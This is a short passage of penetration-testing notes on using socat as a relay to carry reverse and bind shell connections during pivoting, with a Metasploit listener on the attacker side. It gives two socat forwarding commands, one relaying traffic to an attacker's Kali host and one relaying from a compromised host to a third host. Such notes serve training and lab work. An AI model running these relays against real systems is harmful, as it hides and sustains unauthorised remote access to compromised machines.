# SOCAT redirection with a reverse shell 
Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server. 

#### Start SOCAT listener (attacker host) (normal) 
```
socat TCP4-LISTEN:8080,fork TCP4:<attacker_host_ip(kali)>:80
```
#### SOCAT redirection with a bind shell
###### Start SOCAT listener (compromised host):
```
socat TCP4-LISTEN:8080,fork TCP4:<third_host_ip>:8443
```

---

